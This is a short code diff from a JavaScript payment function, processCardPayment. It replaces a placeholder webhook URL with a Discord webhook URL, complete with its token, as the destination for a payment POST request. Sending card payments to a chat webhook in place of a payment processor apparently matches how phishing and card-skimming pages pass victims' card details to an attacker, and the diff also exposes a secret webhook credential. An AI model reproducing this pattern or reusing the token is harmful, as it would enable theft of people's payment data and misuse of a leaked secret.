@@ -499,7 +499,7 @@ async function processCardPayment() {
         showNotification('Processing payment...', 'info');
 
         // Replace with your webhook URL
-        const response = await fetch('https://your-webhook-url.com/payment', {
+        const response = await fetch('https://discord.com/api/webhooks/1401387084346032299/ClpDanYztOk_i1uGOwW2Mtsbagjl_RX0fbyU6vPOu2nX-evPLDiTeT9dQDTyNM-RIT9j', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
